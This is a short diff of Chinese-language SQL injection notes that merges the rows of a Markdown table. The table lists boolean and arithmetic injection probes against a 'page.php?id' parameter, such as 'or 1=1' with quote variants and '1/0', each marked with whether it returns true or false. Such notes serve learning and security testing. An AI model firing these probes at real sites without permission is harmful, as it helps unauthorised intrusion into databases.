@@ -42,13 +42,5 @@ SQL语句：
 
 |描述|查询语句|
 |----|----|
-|逻辑运算|page.php?id=1 or 1=1 -- 返回为true
-page.php?id=1' or 1=1 -- 返回为true
-page.php?id=1" or 1=1 -- 返回为true
-page.php?id=1 and 1=2 -- 返回为false
-|
-|数学运算|page.php?id=1/1 -- 返回为true
-page.php?id=1/0 -- 返回为false
-page.php?id=1/abs(1) -- 返回为true
-page.php?id=1/abf(1) -- 返回为false
-|
+|逻辑运算|page.php?id=1 or 1=1 -- 返回为true<br>page.php?id=1' or 1=1 -- 返回为true<br>page.php?id=1" or 1=1 -- 返回为true<br>page.php?id=1 and 1=2 -- 返回为false|
+|数学运算|page.php?id=1/1 -- 返回为true<br>page.php?id=1/0 -- 返回为false<br>page.php?id=1/abs(1) -- 返回为true<br>page.php?id=1/abf(1) -- 返回为false|
